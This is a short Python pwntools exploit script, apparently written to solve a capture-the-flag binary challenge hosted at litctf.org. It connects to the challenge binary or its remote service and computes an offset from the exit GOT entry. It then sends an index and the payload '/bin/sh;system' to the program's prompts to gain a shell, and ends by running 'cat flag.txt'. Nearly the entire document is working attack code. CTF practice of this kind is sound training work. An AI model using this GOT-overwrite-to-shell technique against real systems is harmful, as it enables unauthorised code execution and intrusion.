from operator import le
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("litctf.org", 31790)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

leet = 0x04080  #0x118
exit_got = elf.got["exit"]   #0x4020
log.success(hex(elf.symbols["main"])) #1204
log.success(hex(elf.plt["puts"])) # 10a4

delate = exit_got - leet

ddebug("breakrva 0x012DE\n breakrva 0x1381\n continue")
io.sendlineafter("Where are you beginning your leet?\n", str(0x1f97-8).encode())
io.sendafter("What do you want to leet?\n", b'/bin/sh;system\0')

io.sendline(b"cat flag.txt")


io.interactive()
